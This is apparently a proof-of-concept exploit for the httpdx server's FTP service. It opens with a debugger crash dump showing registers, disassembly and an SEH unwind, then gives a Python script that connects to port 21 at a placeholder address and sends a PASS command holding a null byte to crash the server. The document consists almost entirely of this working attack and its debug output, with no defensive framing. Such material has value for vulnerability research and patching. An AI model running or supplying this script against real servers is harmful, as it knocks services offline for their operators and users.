#============================PASS Command===============================
 
#CONTEXT DUMP
# EIP: 77c47b79 mov [edi],eax
# EAX: 00000000 ( 0) -> N/A
# EBX: fffffffa (4294967290) -> N/A
# ECX: 3ffed77d (1073665917) -> N/A
# EDX: 7efeff1f (2130640671) -> N/A
# EDI: 00c63000 ( 12988416) -> N/A
# ESI: 00c17cfe ( 12680446) -> (heap)
# EBP: 0186dde4 ( 25615844) -> @|t@@|@@|@@||| (stack)
# ESP: 0186ba9c ( 25606812) -> |)@| PASS (heap)
# +04: 00000000 ( 0) -> N/A
# +08: 00000000 ( 0) -> N/A
# +0c: 0040d729 ( 4249385) -> N/A
# +10: 00c18df8 ( 12684792) -> (heap)
# +14: 00c17cfd ( 12680445) -> (heap)
 
#disasm around:
# 0x77c47b61 and edx,0xff
# 0x77c47b67 mov [edi],edx
# 0x77c47b69 jmp 0x77c47b6f
# 0x77c47b6b xor edx,edx
# 0x77c47b6d mov [edi],edx
# 0x77c47b6f add edi,0x4
# 0x77c47b72 xor eax,eax
# 0x77c47b74 dec ecx
# 0x77c47b75 jz 0x77c47b81
# 0x77c47b77 xor eax,eax
# 0x77c47b79 mov [edi],eax
# 0x77c47b7b add edi,0x4
# 0x77c47b7e dec ecx
# 0x77c47b7f jnz 0x77c47b79
# 0x77c47b81 and ebx,0x3
# 0x77c47b84 jnz 0x77c47b0b
# 0x77c47b86 mov eax,[esp+0x10]
# 0x77c47b8a pop ebx
# 0x77c47b8b pop esi
# 0x77c47b8c pop edi
# 0x77c47b8d ret
 
#stack unwind:
# httpdx.exe:0040ffec
# kernel32.dll:7c80b713
 
#SEH unwind:
# ffffffff -> kernel32.dll:7c839ac0 push ebp
 
#!/usr/bin/python
 
import socket
 
buffer = "\000"
 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('xxx.xxx.xxx.xxx',21)) #Remember to put in the server's address
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.recv(1024)
s.close 